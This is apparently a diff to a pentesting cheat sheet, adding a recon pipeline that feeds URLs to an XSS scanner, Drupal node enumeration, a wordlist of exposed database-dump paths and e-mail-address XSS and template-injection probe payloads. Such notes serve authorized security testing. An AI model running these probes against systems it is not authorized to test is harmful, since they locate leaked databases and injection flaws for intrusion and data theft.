@@ -85,3 +85,45 @@ cat domains_subfinder_$1 | tee -a domain_$1
 cat domains_$1 | filter-resolved | tee -a domains_$1.txt
 
 cat domains_$1.txt | ~/go/bin/httprobe -p http:81 -p http:8080 -p https:8443 | waybackurls | kxss | tee xss.txt
+__
+Find hidden pages on Drupal
+https://target.com/node/1
+https://target.com/node/2
+
+__
+
+Forgotten database dumps
+/back.sql
+/backup.sql
+/accounts.sql
+/backups.sql
+/clients.sql
+/customers.sql
+/data.sql
+/database.sql
+/database.sqlite
+/users.sql
+/db.sql
+/db.sqlite
+/db_backup.sql
+/dbase.sql
+/dbdump.sql
+setup.sql
+sqldump.sql
+/dump.sql
+/mysql.sql
+/sql.sql
+/temp.sql
+
+###E-mail address payloads####
+The following payloads are all valid e-mail addresses that we can use for pentesting of not only web based e-mail systems.
+
+XSS (Cross-Site Scripting):
+
+test+(<script>alert(0)</script>)@example.com
+test@example(<script>alert(0)</script>).com
+"<script>alert(0)</script>"@example.com
+Template injection:
+
+"<%= 7 * 7 %>"@example.com
+test+(${{7*7}})@example.com
